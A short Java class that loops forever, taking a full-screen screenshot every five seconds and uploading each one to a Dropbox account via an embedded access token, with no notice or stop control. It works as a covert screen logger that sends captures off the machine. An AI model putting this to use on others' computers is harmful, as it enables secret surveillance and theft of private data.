import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread
{
    public void run()
    {
        String ACCESS_TOKEN = "**********";

        // Create Dropbox client
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        for(;;) {

            // Making screenshot
            BufferedImage image = null;
            try {
                image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            } catch (AWTException e) {
                e.printStackTrace();
            }

            // Screenshot's datetime
            DateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
            String currentDate = dateFormat.format(new Date());

            // Upload file to Dropbox
            try {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(image, "png", baos);
                InputStream in = new ByteArrayInputStream(baos.toByteArray());
                FileMetadata metadata = client.files()
                        .uploadBuilder("/" + currentDate + ".png")
                        .uploadAndFinish(in);
            } catch(Exception ex){
                ex.printStackTrace();
            }

            try {
                sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
